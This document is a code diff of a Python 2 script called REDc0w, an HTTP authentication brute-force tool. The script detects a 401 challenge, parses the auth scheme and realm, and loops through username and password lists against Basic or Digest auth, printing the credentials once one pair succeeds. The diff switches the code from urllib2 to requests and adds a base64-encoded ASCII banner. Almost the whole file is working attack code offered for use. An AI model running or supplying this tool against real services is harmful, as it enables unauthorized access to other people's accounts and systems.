@@ -1,84 +1,104 @@
 #!/usr/bin/python2
 
-#
-#
-#
+# REDc0w
 
+import requests
 import argparse
-import urllib2
 import os.path
 import base64
 import sys
-import ssl
 import re
 
+from requests.auth import HTTPDigestAuth
 from datetime import datetime
-
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
 
 class HTTP_Auth_Attack(object):
 
-    def __init__(self, host, userlist, passlist):
-        self.host = host
-        self.userlist = self.parse_list(userlist)
-        self.passlist = self.parse_list(passlist)
+    def __init__(self, target, userlist, passlist):
+        self.target = target
+        self.userlist = self.__parse_list(userlist)
+        self.passlist = self.__parse_list(passlist)
+        self.attempts = 0
 
-    def parse_list(self, list):
-        if os.path.isfile(list):
-            ret = ([line.rstrip('\n') for line in open(list)])
-        else:
-            ret = []
-            ret.append([list])
-        return ret
+    def __parse_list(self, x):
+        if os.path.isfile(x): return ([line.rstrip('\n') for line in open(x)])
+        else: return list([x])
 
-    def smash_auth(self):
-        req = urllib2.Request(self.host)
+    def __motd(self):
+        data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
+        print(base64.b64decode(data00))
+        print("[*] - Sending initial request to URL '%s'\n") % (self.target)
+        print("[*] - Checking for authentication...\n")
+
+    def init_attack(self):
+        self.__motd()
         try:
-            handle = urllib2.urlopen(req, context=ctx)
-        except IOError, e:
-            #we want this to occur
-            pass
+            r = requests.get(self.target)
+        except requests.exceptions.RequestException:
+            print("\t--> [\033[91mx\033[0m] - '\033[91mConnection Refused\033[0m' received from '%s'. Exiting.\n") % (self.target)
+            sys.exit(2)
         else:
-            print("[x] This page is not protected by authentication")
-            sys.exit(1)
+            if not r.status_code == 401:
+                print("\t--> [\033[91mx\033[0m] - '%s' did not reply with http authentication challange (\033[91mno 401 response\033[0m).\n") % (self.target)
+                sys.exit(2)
+            else:
+                print("\t--> [\033[92m!\033[0m] HTTP Authentication Detected!\n")
 
-        if not hasattr(e, 'code') or e.code !=401:
-            print("[x] This page is not providing us a 401 reply.. Exiting")
-            #print("%s") % (e.headers)
-            sys.exit(1)
+                http_auth_string = r.headers['www-authenticate']
+                http_auth_objects = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
+                http_match_object = http_auth_objects.match(http_auth_string)
+                http_auth_scheme = http_match_object.group(1)
+                http_auth_realm = http_match_object.group(2)
 
-        auth_headers = e.headers['www-authenticate']
-        auth_object  = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
-        match_object = auth_object.match(auth_headers)
+                if not http_auth_scheme:
+                    print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth scheme\033[0m' from '%s'. Exiting.\n") % (self.target)
+                    sys.exit(2)
 
-        if not match_object:
-            print "[x] The authentication header is fucked up.. Exiting."
-            print "[x] Malformed Header: " + auth_headers
-            sys.exit(1)
+                if not http_auth_realm:
+                    print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth realm\033[0m' from '%s'. Exiting.\n") % (self.target)
+                    sys.exit(2)
 
-        auth_scheme = match_object.group(1)
-        auth_realm  = match_object.group(2)
+                #Basic Auth
+                if http_auth_scheme.lower() == 'basic':
+                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mBasic\033[0m' \n")
+                    for _user in self.userlist:
+                        for _pass in self.passlist:
+                            self.attempts+=1
+                            basic_r = requests.post(self.target, auth=(_user, _pass))
+                            print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
+                            if basic_r.status_code == 200:
+                                print '\n'
+                                print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+                                print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
+                                sys.exit(1)
+                            else:
+                                continue
+                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
+                    sys.exit(1)
 
-        for _user in self.userlist:
-            for _pass in self.passlist:
-                cred = base64.encodestring('%s:%s' % (_user, _pass))[:-1]
-                auth_header = "Basic %s" % cred
-                req.add_header("Authorization", auth_header)
+                #Digest Auth
+                if http_auth_scheme.lower() == 'digest':
+                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mDigest\033[0m' \n")
+                    for _user in self.userlist:
+                        for _pass in self.passlist:
+                            self.attempts+=1
+                            digest_r = requests.post(self.target, auth=HTTPDigestAuth(_user, _pass))
+                            print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
+                            if digest_r.status_code == 200:
+                                print '\n'
+                                print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+                                print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
+                                sys.exit(1)
+                            else:
+                                continue
+                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
+                    sys.exit(1)
 
-                try:
-                    print("Attempting Break with user '%s' and password '%s'") % (_user, _pass)
-                    handle = urllib2.urlopen(req, context=ctx)
-                except:
-                    pass
-                else:
-                    print("----\n")
-                    print("[!] Username: '%s' | Password: '%s' FOUND!\n") % (_user, _pass)
-                    print("----\n")
-                    sys.exit(0)
-
-
+                if http_auth_scheme.lower() == 'oauth':
+                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mOAuth\033[0m' \n")
+                    print("\t--> ^^ Coming Soon\n")
+                    sys.exit(1)
+                sys.exit(2)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
@@ -88,5 +108,5 @@ if __name__ == '__main__':
     auth_group.add_argument('-p', required="true", dest="passlist", help="A password or a file containing a list of passwords")
     args = parser.parse_args()
 
-    obj = HTTP_Auth_Attack(args.target, args.userlist, args.passlist)
-    obj.smash_auth()
+    HAA = HTTP_Auth_Attack(args.target, args.userlist, args.passlist)
+    HAA.init_attack()
